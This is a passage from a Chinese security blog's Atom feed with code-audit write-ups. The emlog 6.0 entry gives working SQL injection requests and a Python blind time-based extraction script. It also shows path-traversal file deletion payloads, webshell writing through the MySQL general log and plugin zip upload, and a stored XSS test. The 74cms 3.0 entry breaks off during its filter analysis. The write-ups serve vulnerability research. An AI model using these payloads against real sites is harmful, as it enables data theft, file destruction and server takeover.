<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2019-03-26T12:04:38.899Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计--emlog6.0</title>
    <link href="https://Foxgrin.github.io//posts/15210/"/>
    <id>https://Foxgrin.github.io//posts/15210/</id>
    <published>2019-03-19T12:15:00.000Z</published>
    <updated>2019-03-26T12:04:38.899Z</updated>
    
    <content type="html"><![CDATA[<p>记录emlog6.0审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>分析网站根目录下<code>/index.php</code>包含的头文件<code>/init.php</code>，可以发现，其中对GET,POST等进行处理的只有第二十一行的函数<code>doStripslashes()</code>，跟踪该函数，发现该函数作用居然还是去除转义字符，所以可以说，全局对GET,POST数据实际上是毫无过滤的。所以接下来，我们可以在Seay审计系统下进行全局搜索GET和POST的数据，如果没有其他过滤，那么是非常好利用的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p><code>/admin/comment.php</code>第46行语句<code>$ip = isset($_GET[&#39;ip&#39;]) ? $_GET[&#39;ip&#39;] : &#39;&#39;;</code>未对参数<code>$_GET[&#39;ip&#39;]</code>进行过滤，在47行中将变量<code>$ip</code>传入函数<code>delCommentByIp()</code>，跟踪该函数，在<code>/include/model/comment_model.php</code>中第152行中将该参数拼接到SQL语句，经由单引号包裹</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>经过全局分析我们知道实际上<code>$_GET[&#39;ip&#39;]</code>参数是没有任何过滤的，所以我们可以很轻松的进行SQL注入，这里采用的是报错注入</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /emlog/admin/comment.php?action=delbyip&amp;ip=127.0.0.1&apos;%20and%20extractvalue(1,concat(0x3a,database(),0x3a))%23&amp;token=2559f394de1177aaf9652f6ea371566d HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/comment.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>注意这里因为有检查Token机制，所以我们必须在页面上进行抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样在<code>/admin/tag.php</code>第44行语句<code>$tags = isset($_POST[&#39;tag&#39;]) ? $_POST[&#39;tag&#39;] : &#39;&#39;;</code>未对变量<code>$_POST[&#39;tag&#39;]</code>进行过滤，在53行中将变量<code>$tags</code>的键值传入函数<code>deleteTag()</code>，跟踪函数，在<code>/include/model/tag_model.php</code>中将该变量拼接到<code>DELETE</code>语句中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为是DELETE语句，所以这里采用延时注入，同时需要注意因为我们不能保证<code>$tagId</code>一定存在于表中，而且即便存在，执行完一次也会被删除，所以这里采用<code>or</code>连接，保证后面的延时注入语句能执行，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/tag.php?action=dell_all_tag HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 101</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/tag.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tag[0 or if(ascii(substr(database(),0,1))%3d101,0,sleep(3))]=1&amp;token=2559f394de1177aaf9652f6ea371566d</span><br></pre></td></tr></table></figure><p>之后就是写脚本注入，但是这里同样采用了验证TOKEN机制，而且我们必须登录后台才能进行该项操作，所以需要采用python的Session机制进行登录并抓取页面TOKEN值，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s,login_url,user,pw)</span>:</span></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'user'</span>:user,</span><br><span class="line">        <span class="string">'pw'</span>:pw</span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url=login_url,data=login_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(s,token_url)</span>:</span></span><br><span class="line">    r = s.get(token_url)</span><br><span class="line">    soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>,attrs=&#123;<span class="string">'name'</span>:<span class="string">'token'</span>&#125;)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(s,url,token)</span>:</span></span><br><span class="line">    database = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'tag[0 or if(ascii(substr(database(),%d,1))=%d,sleep(3),0)]'</span>%(i,j):<span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'token'</span>:token</span><br><span class="line">            &#125;</span><br><span class="line">            start = time.perf_counter()</span><br><span class="line">            s.post(url,data=data)</span><br><span class="line">            end = time.perf_counter()</span><br><span class="line">            t = end - start</span><br><span class="line">            <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">                database = database + chr(j)</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    print(<span class="string">"database:"</span>,database)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    login_url = <span class="string">"http://127.0.0.1/emlog/admin/index.php?action=login"</span></span><br><span class="line">    login(s,login_url,<span class="string">'admin01'</span>,<span class="string">'admin01'</span>)</span><br><span class="line">    token_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php"</span></span><br><span class="line">    token = get_token(s,token_url)</span><br><span class="line">    target_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php?action=dell_all_tag"</span></span><br><span class="line">    get_database(s,target_url,token)</span><br></pre></td></tr></table></figure><p><code>/admin/navbar.php</code>第78行<code>$pages = isset($_POST[&#39;pages&#39;]) ? $_POST[&#39;pages&#39;] : array();</code>存在未过滤变量<code>$pages</code>，在85行将变量<code>$pages</code>的键值作为变量<code>$id</code>传入函数<code>addNavi()</code>中，跟踪该函数，在<code>/include/model/navi_model.php</code>中将该变量拼接到<code>INSERT</code>语句中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>INSERT注入我们采用的是<code>select case when 条件 then sleep(3) else 1 end</code>的延时注入，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/navbar.php?action=add_page HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">pages[1%2b(select case when(1%3d1) then sleep(3) else 1 end)]=1</span><br></pre></td></tr></table></figure><p>脚本参考上面，这里略</p><h3 id="2-任意文件删除漏洞"><a href="#2-任意文件删除漏洞" class="headerlink" title="2.任意文件删除漏洞"></a>2.任意文件删除漏洞</h3><p><code>/admin/data.php</code>第143-144行存在未过滤变量<code>$_POST[&#39;bak&#39;]</code>拼接到<code>unlink</code>中，导致任意路径穿越删除文件漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/data.php?action=dell_all_bak HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">bak[0]=../../hint.php</span><br></pre></td></tr></table></figure><p><code>/admin/blogger.php</code>第92行存在危险函数<code>unlink</code>，跟踪变量<code>$icon_1</code>，该变量来自80行中的sql查询字段<strong>photo</strong>返回结果，跟踪语句31行中变量<code>$photo</code>通过POST传入，有转义处理，并在72行中将photo更新到数据库中，虽然有转义处理，依旧可以造成任意路径穿越删除文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>实现的过程如下：先通过POST将构造的任意路径变量<code>$photo</code>更新到数据库中（<code>$action=update</code>），再通过<code>$action=delicon</code>触发<code>unlink($icon_1)</code>，进行任意文件删除</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/blogger.php?action=update HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 979</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/blogger.php?active_del=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;</span><br><span class="line"></span><br><span class="line">../../info.php</span><br></pre></td></tr></table></figure><h3 id="3-通过后台数据库备份上传webshell"><a href="#3-通过后台数据库备份上传webshell" class="headerlink" title="3.通过后台数据库备份上传webshell"></a>3.通过后台数据库备份上传webshell</h3><p>对于在<code>/emlog/init.php</code> 中的变量 <code>$action</code>，当我们通过GET方式传入<code>$action[]</code>数组的形式，会出现语法错误报错导致的网站路径泄露，可以考虑结合sql注入写入webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<code>/admin/data.php</code>中发现了可以进行本地数据库备份，并可以上传数据库备份文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么就可以考虑加入语句</p><p><code>SELECT &quot;&lt;?php phpinfo(); ?&gt;&quot; INTO outfile &quot;E:\php\PHPTutorial\WWW\emlog\shell.php&quot;;</code>如果网站数据库的配置<code>secure_file_priv</code>为空，那么我们就可以直接在网站根目录下写入webshell</p><p>我们先随意备份一个数据库文件，然后加入上述语句，上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>结果出现了报错信息<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code>说明数据库配置<code>secure_file_priv</code>为null，并且我们无法通过SQL语句改变该配置值，在数据库中验证<code>show global variables like &#39;%secure%&#39;;</code></p><p>所以我们考虑另一种方法，通过设置SQL日志的方式，首先需要保证<code>general_log=on</code>，再修改<code>general_log_file</code>的日志写入文件绝对路径</p><p>在数据库文件中加入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = &apos;on&apos;;</span><br><span class="line">SET GLOBAL general_log_file = &apos;E:/php/PHPTutorial/WWW/emlog/shell.php&apos;;</span><br><span class="line">SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;;</span><br></pre></td></tr></table></figure><p>然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出显示了上传成功</p><p>然后我们可以看到在网站的根目录下出现了<code>shell.php</code>即我们上传的webshell，它实际上是一个日志文件，只不过我们加入了可执行的Php代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="4-通过上传ZIP文件上传webshell"><a href="#4-通过上传ZIP文件上传webshell" class="headerlink" title="4.通过上传ZIP文件上传webshell"></a>4.通过上传ZIP文件上传webshell</h3><p><code>/admin/plugin.php</code>页面可以上传一个zip压缩包，并在后台将压缩包解压成文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟踪<code>emUnZip()</code>函数，在<code>/include/lib/function.base.php</code>下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>图中有我自己添加的测试代码，用来测试<code>ZipArchive</code>类的<code>getNameIndex</code>和<code>getFromName</code>函数的输出值</p><p>我们试着上传一个test.zip，压缩包中包含demo文件夹，demo文件夹下包含demo.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出这里<code>getNameIndex()</code>函数返回结果是压缩包下的文件夹名即<code>demo/</code>，在768行中<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo/demo.php</code>即压缩包下的目录内容，从响应包结果来看是上传成功的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以猜出<code>getFromName</code>函数应该是判断压缩包下的文件目录如果与传入的参数一致，则返回true，所以可以看出我们上传的文件夹名必须和文件名是相同的，后面即可解压压缩包，上传webshell</p><p>如果我们上传的压缩包只包含一个php文件，可以看一下测试的响应结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo.php/demo.php.php</code>，从响应结果<code>Location: ./plugin.php?error_e=1</code>来看很明显是上传失败，返回-1，说明是<code>$re == false</code>导致的，即<code>getFromName</code>函数判断压缩包不存在该目录</p><h3 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5.存储型XSS"></a>5.存储型XSS</h3><p><code>/admin/write_log.php</code>添加文章存在html代码形式，尝试直接添加<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>添加后访问网站首页出现弹框</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>抓包分析</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟踪到<code>/admin/save_log.php</code>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><code>$content</code>变量只有经过转义处理，还是过滤不当引起的xss</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该CMS较小，代码简洁易懂，大部分的漏洞，由于全局不存在输入过滤，所以通过全局搜索POST，GET数据发现的，还是那句话，输入过滤不够，导致的漏洞</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--74cms3.0</title>
    <link href="https://Foxgrin.github.io//posts/5451/"/>
    <id>https://Foxgrin.github.io//posts/5451/</id>
    <published>2019-03-18T12:15:00.000Z</published>
    <updated>2019-03-20T12:12:36.692Z</updated>
    
    <content type="html"><![CDATA[<p>记录74cms3.0审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>先进入根目录的<code>index.php</code>，跟进包含的头文件<code>/include/common.inc.php</code>，该文件又包含了三个文件，其中<code>/data/config.php</code>和<code>/include/74cms_version.php</code>为网站配置和版本文件，无需关心。<code>/include/common.fun.php</code>为函数文件。继续往下审计，发现21-30行对输入数据进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">&#123;</span><br><span class="line">$_GET  = addslashes_deep($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">&#123;</span><br><span class="line">$_POST = addslashes_deep($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">$_REQUEST  = addslashes_deep($_REQUEST);</span><br></pre></td></tr></table></figure><p>在<code>/include/common.fun.php</code>跟踪<code>addslashes_deep</code>函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>过滤总结起来就是对<code>$_GET $_POST $_COOKIE $_REQUEST</code>数据都进行单引号双引号的转义，以及过滤标签的处理</p><p>GET,POST,COOKIE都有过滤，那么IP字段有没有过滤呢，按照之前审计都有一个<code>getip()</code>函数来获取头部的IP字段，果然在101行发现该函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里进行了正则匹配过滤出格式合法的IP值，所以我们无法利用IP字段</p><p>也就是说，在后面的审计过程中，只要发现文件包含了<code>/include/common.inc.php</code>，那么就无法通过注入标签进行XSS攻击，以及限制了SQL注入，但是，我们注意配置文件<code>/include/mysql.class.php</code>中的第29行设置了数据库的编码方式为<code>GBK</code>，所以在有单引号或双引号包裹的情况下是可以考虑进行<strong>宽字节注入</strong>的</p><p>类似于前台，<code>/admin/</code>后台的文件头部也包含了<code>/admin/include/admin_common.inc.php</code>，过滤如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 